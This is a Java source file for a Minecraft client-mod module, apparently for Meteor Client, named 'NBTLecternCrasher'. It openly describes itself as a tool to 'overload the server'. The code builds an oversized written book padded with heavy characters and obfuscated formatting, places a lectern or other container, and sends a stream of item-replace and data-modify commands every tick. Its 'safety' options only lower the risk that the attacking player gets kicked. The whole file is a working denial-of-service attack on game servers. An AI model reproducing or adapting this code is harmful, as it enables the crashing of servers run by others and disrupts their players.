package orbiter.modules;

import orbiter.Orbiter;
import orbiter.util.CommandUtils;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.core.component.DataComponents;
import net.minecraft.world.item.component.WrittenBookContent;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.item.Items;
import net.minecraft.network.protocol.game.ServerboundSetCreativeModeSlotPacket;
import net.minecraft.network.chat.MutableComponent;
import net.minecraft.server.network.FilteredText;
import net.minecraft.network.chat.Component;
import net.minecraft.server.network.Filterable;
import net.minecraft.ChatFormatting;
import net.minecraft.core.BlockPos;

import java.util.ArrayList;
import java.util.List;

public class NBTLecternCrasher extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final SettingGroup sgBook = settings.createGroup("Book Settings");
    private final SettingGroup sgContainer = settings.createGroup("Container Mode");
    private final SettingGroup sgSafety = settings.createGroup("Safety");

    private final Setting<Integer> spamDelay = sgGeneral.add(new IntSetting.Builder()
            .name("spam-delay")
            .description("Ticks between each lectern interaction attempt.")
            .defaultValue(1)
            .min(1)
            .sliderRange(1, 20)
            .build());

    private final Setting<Integer> commandsPerTick = sgGeneral.add(new IntSetting.Builder()
            .name("commands-per-tick")
            .description("Number of interaction packets per tick.")
            .defaultValue(5)
            .min(1)
            .sliderRange(1, 20)
            .build());

    private final Setting<Boolean> autoPlaceLectern = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-place-lectern")
            .description("Automatically place a lectern in front of you.")
            .defaultValue(true)
            .build());

    private final Setting<Boolean> autoGiveBook = sgGeneral.add(new BoolSetting.Builder()
            .name("auto-give-book")
            .description("Automatically give yourself the crash book.")
            .defaultValue(true)
            .build());

    private final Setting<Integer> pages = sgBook.add(new IntSetting.Builder()
            .name("pages")
            .description("Number of pages in the crash book.")
            .defaultValue(100)
            .min(1)
            .sliderRange(1, 200)
            .build());

    private final Setting<Integer> charsPerPage = sgBook.add(new IntSetting.Builder()
            .name("chars-per-page")
            .description("Characters per page. More = bigger NBT payload.")
            .defaultValue(256)
            .min(1)
            .sliderRange(1, 2048)
            .build());

    private final Setting<String> fillChar = sgBook.add(new StringSetting.Builder()
            .name("fill-character")
            .description("Character used to fill pages.")
            .defaultValue("\u9F98")
            .build());

    private final Setting<Boolean> alternateObfuscated = sgBook.add(new BoolSetting.Builder()
            .name("alternate-obfuscated")
            .description("Alternates heavy characters with obfuscated formatting.")
            .defaultValue(true)
            .build());

    private final Setting<CrashTarget> crashTarget = sgContainer.add(new EnumSetting.Builder<CrashTarget>()
            .name("crash-target")
            .description("Which container type to target for crashing.")
            .defaultValue(CrashTarget.Lectern)
            .build());

    private final Setting<Integer> containerSlots = sgContainer.add(new IntSetting.Builder()
            .name("container-slots")
            .description("Number of slots to fill in containers.")
            .defaultValue(27)
            .min(1)
            .sliderRange(1, 54)
            .visible(() -> crashTarget.get() != CrashTarget.Lectern)
            .build());

    private final Setting<Boolean> disableOnLeave = sgSafety.add(new BoolSetting.Builder()
            .name("disable-on-leave")
            .description("Disable this module automatically when you leave the server/world.")
            .defaultValue(true)
            .build());

    private final Setting<Boolean> safeBookPayload = sgSafety.add(new BoolSetting.Builder()
            .name("safe-book-payload")
            .description("Clamp book payload size to reduce self-kick risk.")
            .defaultValue(true)
            .build());

    private final Setting<Integer> safeMaxPages = sgSafety.add(new IntSetting.Builder()
            .name("safe-max-pages")
            .description("Maximum pages when safe-book-payload is enabled.")
            .defaultValue(30)
            .min(1)
            .sliderRange(1, 100)
            .visible(safeBookPayload::get)
            .build());

    private final Setting<Integer> safeMaxCharsPerPage = sgSafety.add(new IntSetting.Builder()
            .name("safe-max-chars-per-page")
            .description("Maximum chars per page when safe-book-payload is enabled.")
            .defaultValue(120)
            .min(1)
            .sliderRange(1, 512)
            .visible(safeBookPayload::get)
            .build());

    private int tickCounter = 0;
    private boolean bookGiven = false;
    private boolean lecternPlaced = false;
    private boolean containerPlaced = false;
    private int setupPhase = 0;
    private int containerCycleIndex = 0;

    public NBTLecternCrasher() {
        super(Orbiter.CATEGORY_OP, "nbt-lectern-crasher",
                "Creates a massive NBT book and spams lectern interactions to overload the server. Creative + OP.");
    }

    @Override
    public void onActivate() {
        if (mc.player == null) {
            toggle();
            return;
        }

        if (!mc.player.getAbilities().instabuild) {
            warning("You must be in Creative mode!");
            toggle();
            return;
        }

        tickCounter = 0;
        bookGiven = false;
        lecternPlaced = false;
        containerPlaced = false;
        setupPhase = 0;
        containerCycleIndex = 0;

        if (safeBookPayload.get()) {
            info("Safe payload is enabled. Large book settings will be clamped to reduce self-kick risk.");
        }

        info("NBT Crasher activated! Target: " + crashTarget.get());
        info("Phase 1: Creating crash book...");
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (!disableOnLeave.get() || !isActive()) return;

        info("Disconnected from world/server. NBT Lectern Crasher disabled by safety setting.");
        toggle();
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null || mc.player.connection == null)
            return;

        tickCounter++;

        if (setupPhase == 0) {
            if (autoGiveBook.get() && !bookGiven) {
                giveBookToPlayer();
                bookGiven = true;
                info("Crash book created and given!");
            }
            setupPhase = 1;
            return;
        }

        if (setupPhase == 1) {
            if (!autoPlaceLectern.get()) {
                setupPhase = 2;
                return;
            }

            CrashTarget target = crashTarget.get();
            if (target == CrashTarget.All) {
                CrashTarget[] targets = { CrashTarget.Lectern, CrashTarget.Chest, CrashTarget.Barrel, CrashTarget.Shulker };
                target = targets[containerCycleIndex % targets.length];
                containerCycleIndex++;
            }

            BlockPos pos = mc.player.blockPosition().offset(mc.player.getDirection().getStepX() * 2, mc.player.getDirection().getStepY() * 2, mc.player.getDirection().getStepZ() * 2);

            switch (target) {
                case Lectern -> {
                    if (!lecternPlaced) {
                        mc.player.connection.sendCommand(CommandUtils.vanilla(
                                CommandUtils.formatCommand("setblock %d %d %d minecraft:lectern", pos.getX(), pos.getY(), pos.getZ())));
                        lecternPlaced = true;
                        info("Lectern placed! Phase 2: Spamming interactions...");
                    }
                }
                case Chest -> {
                    if (!containerPlaced) {
                        mc.player.connection.sendCommand(CommandUtils.vanilla(
                                CommandUtils.formatCommand("setblock %d %d %d minecraft:chest", pos.getX(), pos.getY(), pos.getZ())));
                        containerPlaced = true;
                        info("Chest placed! Filling with crash items...");
                    }
                }
                case Barrel -> {
                    if (!containerPlaced) {
                        mc.player.connection.sendCommand(CommandUtils.vanilla(
                                CommandUtils.formatCommand("setblock %d %d %d minecraft:barrel", pos.getX(), pos.getY(), pos.getZ())));
                        containerPlaced = true;
                        info("Barrel placed! Filling with crash items...");
                    }
                }
                case Shulker -> {
                    if (!containerPlaced) {
                        mc.player.connection.sendCommand(CommandUtils.vanilla(
                                CommandUtils.formatCommand("setblock %d %d %d minecraft:shulker_box", pos.getX(), pos.getY(), pos.getZ())));
                        containerPlaced = true;
                        info("Shulker box placed! Filling with crash items...");
                    }
                }
                default -> {
                }
            }

            setupPhase = 2;
            return;
        }

        if (tickCounter % spamDelay.get() != 0)
            return;

        BlockPos targetPos = mc.player.blockPosition().offset(mc.player.getDirection().getStepX() * 2, mc.player.getDirection().getStepY() * 2, mc.player.getDirection().getStepZ() * 2);

        CrashTarget currentTarget = crashTarget.get();
        if (currentTarget == CrashTarget.All) {
            CrashTarget[] targets = { CrashTarget.Lectern, CrashTarget.Chest, CrashTarget.Barrel, CrashTarget.Shulker };
            int index = Math.max(0, containerCycleIndex - 1) % targets.length;
            currentTarget = targets[index];
        }

        int effectiveChars = getEffectiveCharsPerPage();
        String crashText = buildCrashText(Math.min(effectiveChars, 256));
        String escapedCrashText = escapeForJson(crashText);

        if (currentTarget == CrashTarget.Lectern) {
            for (int i = 0; i < commandsPerTick.get(); i++) {
                String placeBookCmd = CommandUtils.formatCommand(
                        "item replace block %d %d %d container.0 with written_book[written_book_content={title:\"crash\",author:\"orbiter\",pages:['{\\\"text\\\":\\\"%s\\\"}']}]",
                        targetPos.getX(), targetPos.getY(), targetPos.getZ(), escapedCrashText);
                mc.player.connection.sendCommand(CommandUtils.vanilla(placeBookCmd));

                String pageCmd = CommandUtils.formatCommand("data modify block %d %d %d Page set value %d",
                        targetPos.getX(), targetPos.getY(), targetPos.getZ(), 0);
                mc.player.connection.sendCommand(CommandUtils.vanilla(pageCmd));
            }
        } else {
            for (int i = 0; i < commandsPerTick.get(); i++) {
                int slot = (tickCounter + i) % Math.max(1, containerSlots.get());
                String itemCmd = CommandUtils.formatCommand(
                        "item replace block %d %d %d container.%d with written_book[written_book_content={title:\"crash\",author:\"orbiter\",pages:['{\\\"text\\\":\\\"%s\\\"}']}]",
                        targetPos.getX(), targetPos.getY(), targetPos.getZ(), slot, escapedCrashText);
                mc.player.connection.sendCommand(CommandUtils.vanilla(itemCmd));
            }

            if (tickCounter % 5 == 0) {
                for (int slot = 0; slot < Math.min(containerSlots.get(), 27); slot++) {
                    String dataCmd = CommandUtils.formatCommand("data modify block %d %d %d Items[%d].count set value 64",
                            targetPos.getX(), targetPos.getY(), targetPos.getZ(), slot);
                    mc.player.connection.sendCommand(CommandUtils.vanilla(dataCmd));
                }
            }
        }
    }

    private void giveBookToPlayer() {
        if (mc.player == null || mc.player.connection == null) return;
        ItemStack book = new ItemStack(Items.WRITTEN_BOOK, 1);

        int effectivePages = getEffectivePages();
        int effectiveChars = getEffectiveCharsPerPage();
        String fill = getSafeFillCharacter();

        List<Filterable<Component>> bookPages = new ArrayList<>();
        for (int p = 0; p < effectivePages; p++) {
            MutableComponent pageText = Component.empty();
            for (int c = 0; c < effectiveChars; c++) {
                MutableComponent glyph = Component.literal(fill);
                if (alternateObfuscated.get() && (c % 2 == 1)) glyph = glyph.withStyle(ChatFormatting.OBFUSCATED);
                pageText.append(glyph);
            }
            bookPages.add(Filterable.passThrough(pageText));
        }

        WrittenBookContent content = new WrittenBookContent(
                Filterable.passThrough("Orbiter Crash Book"),
                "Orbiter",
                0,
                bookPages,
                true);

        book.set(DataComponents.WRITTEN_BOOK_CONTENT, content);

        int slot = 36;
        try {
            mc.player.connection.send(new ServerboundSetCreativeModeSlotPacket(slot, book));
            mc.player.getInventory().setItem(0, book);
        } catch (Exception e) {
            error("Failed to send crash book packet safely: " + e.getMessage());
            toggle();
        }
    }

    private int getEffectivePages() {
        int value = Math.max(1, pages.get());
        if (safeBookPayload.get()) value = Math.min(value, safeMaxPages.get());
        return value;
    }

    private int getEffectiveCharsPerPage() {
        int value = Math.max(1, charsPerPage.get());
        if (safeBookPayload.get()) value = Math.min(value, safeMaxCharsPerPage.get());
        return value;
    }

    private String getSafeFillCharacter() {
        String value = fillChar.get();
        if (value == null || value.isBlank()) value = "\u9F98";

        String first = getFirstCodepointAsString(value);

        if (safeBookPayload.get()) {
            if (first.equals("\u00A7")) return "\u9F98";
            return first;
        }

        return first;
    }

    private String buildCrashText(int length) {
        String fill = getSafeFillCharacter();
        if (length <= 0) return fill;

        StringBuilder sb = new StringBuilder(length * 2);
        for (int i = 0; i < length; i++) {
            sb.append(fill);
        }
        return sb.toString();
    }

    private String escapeForJson(String value) {
        String cleaned = value.replace("\u00A7", "").replace("\n", "").replace("\r", "");
        return cleaned.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private String getFirstCodepointAsString(String value) {
        int cp = value.codePointAt(0);
        return new String(Character.toChars(cp));
    }

    @Override
    public void onDeactivate() {
        tickCounter = 0;
        setupPhase = 0;
    }

    public enum CrashTarget {
        Lectern,
        Chest,
        Barrel,
        Shulker,
        All
    }
}
